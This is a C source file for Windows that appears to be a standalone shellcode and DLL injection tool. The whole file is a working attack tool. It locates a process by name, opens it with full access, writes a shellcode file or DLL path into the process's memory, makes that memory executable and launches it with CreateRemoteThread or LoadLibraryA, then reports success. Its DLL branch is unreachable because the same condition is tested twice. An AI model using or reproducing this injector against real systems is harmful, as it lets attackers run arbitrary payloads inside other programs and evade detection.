#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#define SHELLCODE 0x01
#define DLL 0x02


typedef  struct MallocRes MallocRes;
struct MallocRes {
    int size;
    char* buffer;
};

void die(HANDLE hConsole,WORD saved_attributes , char* msg)
{
    SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
    printf(msg);
    SetConsoleTextAttribute(hConsole, saved_attributes);
}

MallocRes openFile(HANDLE hConsole, WORD saved_attributes, char* shellcodePath)
{
    char* shellcodeFileMalloc = NULL;
    FILE* fichier = NULL;
    int caractereActuel = 0;
    int fileSize = 0;
    int i = 0;

    fichier = fopen(shellcodePath, "rb");

    if (fichier != NULL)
    {
        printf("[+] Opening the shellcode file ... OK\n");
        fseek(fichier, 0L, SEEK_END);
        fileSize = ftell(fichier);
        rewind(fichier);

        shellcodeFileMalloc = malloc(sizeof(char) * fileSize + 1);
        memset(shellcodeFileMalloc, 0, fileSize + 1);
        if(shellcodeFileMalloc != NULL)
        {
            printf("[+] Allocating %d bytes for the shellcode ... OK\n", fileSize);
            do
            {
                caractereActuel = fgetc(fichier); // On lit le caractère
                shellcodeFileMalloc[i] = (char) caractereActuel;
                i++;
            } while (caractereActuel != EOF); // On continue tant que fgetc n'a pas retourné EOF (fin de fichier)
        }
        fclose(fichier);
    }
    else
        die(hConsole,saved_attributes, "[!] Cannot open the shellcode file !\n");

    MallocRes res;
    res.buffer = shellcodeFileMalloc;
    res.size = fileSize;

    return res;

}

int GetCalcPID(char* process_name)
{
    int pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnapshot) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if(Process32First(hSnapshot, &pe32)) {
            do {
                if(strcmp(process_name, pe32.szExeFile) == 0)
                {
                    pid = pe32.th32ProcessID;
                    break;
                }

            } while(Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }

    return pid;
}

int  main(int argc, char* argv[])
{
    int kind;
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_SCREEN_BUFFER_INFO consoleInfo;
    WORD saved_attributes;
    GetConsoleScreenBufferInfo(hConsole, &consoleInfo);
    saved_attributes = consoleInfo.wAttributes;
    int size;
    char* shellcode;
    LPVOID addr = NULL;
    HANDLE threadID;

    if(argc <= 3)
    {
        die(hConsole, saved_attributes, "[!] No process, path or type given");
        exit(0);
    }

    if(strcmp(argv[3], "shellcode") == 0)
    {
        MallocRes res = openFile(hConsole, saved_attributes, argv[2]);
        shellcode = res.buffer;
        size = res.size;
        kind = SHELLCODE;
        printf("======== SHELLCODE ========\n");
    }
    else if(strcmp(argv[3], "shellcode") == 0)
    {
        shellcode = argv[2];
        size = (int)strlen(argv[2]);
        kind = DLL;
        printf("======== DLL ========\n");
    }
    else
    {
        die(hConsole, saved_attributes, "[!] Pleaser enter type of payload");
        exit(0);
    }


    if(shellcode == NULL || size == 0)
    {
        printf("[!] Problème lors de l'ouverture du shellcode ");
    }
    else
    {

        int pid = GetCalcPID(argv[1]);

        if(pid != 0)
        {
            printf("[+] %s PID = %d\n", argv[1], pid);
            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
            LPVOID AddressVirtualAlloc;


            if (hProcess)
            {
                printf("[+] OpenProcess ... OK\n");

                if(kind == DLL)
                {
                    addr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                    if(addr != NULL)
                        printf("[+] GetProcAddress 0x%p\n", addr);
                    else
                    {
                        die(hConsole,saved_attributes,"[!] GetProcAddress... NO\n");
                        exit(0);
                    }
                }

                AddressVirtualAlloc = VirtualAllocEx(hProcess, 0, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

                if (AddressVirtualAlloc)
                {
                    printf("[+] Virtual Alloc ... 0x%p\n", AddressVirtualAlloc);
                    if (WriteProcessMemory(hProcess, AddressVirtualAlloc, shellcode, size, NULL))
                    {
                        printf("[+] WriteProcessMemory %d bytes ... OK\n", size);
                        DWORD oldProtect = 0;
                        if (VirtualProtectEx(hProcess, AddressVirtualAlloc, size, PAGE_EXECUTE_READ, &oldProtect))
                        {
                            printf("[+] VirtualProtectEx ... OK\n");
                            if(kind == SHELLCODE)
                            {
                                threadID = CreateRemoteThread(hProcess, NULL, 0,  (LPTHREAD_START_ROUTINE) AddressVirtualAlloc, NULL, NULL, NULL);
                            }
                            else
                            {
                                threadID = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) addr,  AddressVirtualAlloc, NULL, NULL);
                            }
                            if (threadID != NULL)
                            {
                                printf("[+] CreateRemoteThread ... OK\n");
                                printf("[+] Thread ID %d\n", GetThreadId(threadID));
                                SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
                                printf("[+] Injection successful \n");
                                SetConsoleTextAttribute(hConsole, saved_attributes);
                            }
                            else
                                die(hConsole,saved_attributes,"[!] CreateRemoteThread... NO\n");
                        }
                        else
                            die(hConsole,saved_attributes,"[!] VirtualProtectEx ... NO\n");

                    }
                    else
                        die(hConsole,saved_attributes,"[!] WriteProcessMemory ... NO\n");
                }
                else
                    die(hConsole,saved_attributes,"[!] VirtualAllocEx ... NO\n");

            }
            else
                die(hConsole,saved_attributes,"[!] OpenProcess ... NO\n");
        }
        else
            die(hConsole,saved_attributes,"[!] PID not found\n");
    }



    return 0;
}